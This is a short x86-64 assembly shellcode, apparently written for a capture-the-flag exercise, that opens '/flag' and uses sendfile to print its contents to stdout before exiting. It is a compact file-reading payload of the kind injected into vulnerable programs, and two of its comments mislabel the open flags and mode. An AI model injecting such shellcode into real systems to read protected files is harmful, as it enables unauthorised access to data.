.intel_syntax noprefix

.global _start
.section .text

_start:
mov rax, 2                  # sys_open
lea rdi, [rip + filepath]   # File
mov rsi, 0                  # Flags (none)
xor rdx, rdx                # Mode (O_RDONLY)
syscall

mov rdi, 1                  # Out file descriptor (stdout)
mov rsi, rax                # In file descriptor

mov rax, 40                 # sys_sendfile
mov rdx, 0                  # Offset
mov r10, 100                # Arbitrary length
syscall

mov rax, 60                 # sys_exit
mov rdi, 0                  # ErrorCode
syscall

filepath:
.string "/flag"
